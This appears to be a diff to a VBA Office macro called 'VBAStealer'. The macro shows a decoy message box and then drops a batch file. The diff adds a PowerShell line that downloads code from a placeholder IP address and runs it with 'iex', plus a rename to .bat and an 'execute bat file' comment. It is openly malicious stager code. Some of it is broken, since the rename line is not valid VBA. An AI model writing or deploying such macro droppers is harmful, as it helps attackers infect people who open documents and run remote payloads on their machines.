@@ -37,12 +37,14 @@ Sub VBAStealer()
     MsgBox ("You can now view the file!")
 ' Create a file dropper
     Dim filePath As String
-    filePath = "<FILEPATH>"
+    filePath = "<FILEPATH>" ' make a .txt file
     Dim fso As FileSystemObject
     Set fso = New FileSystemObject
     Dim fileStream As TextStream
     Set fileStream = fso.CreateTextFile(filePath)
-    fileStream.WriteLine "<YOUR CODE>"
+    fileStream.WriteLine "powershell.exe iex (iwr http://<IP_ADDRESS>/MalTest)"
     fileStream.Close
+    Name filepath As filepath.bat
+' execute bat file
 
 End Sub
